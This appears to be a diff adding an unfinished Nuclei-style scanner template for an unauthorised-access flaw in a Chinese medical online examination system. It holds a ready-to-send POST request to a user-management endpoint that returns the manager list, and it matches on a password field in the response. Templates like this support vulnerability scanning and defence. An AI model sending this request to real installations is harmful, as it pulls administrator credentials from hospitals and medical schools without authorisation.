@@ -1,0 +1,23 @@
+id: yqyx-User-weak
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 远秋医学在线考试系统采用通用的试题库管理软件，适用于各级各类医学院校和医院。远秋医学在线考试系统某接口存在未授权信息泄露漏洞，攻击者可利用该漏洞获取数据库敏感信息。远秋医学培训报名系统v1.0存在未授权访问漏洞，攻击者可通过漏洞获取登录密码。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /Manage/Ajax/User.ashx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Content-Length: 54
+
+        oper=getManagerList&name=&code=&depart=&page=1&rows=15
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'strPassword'
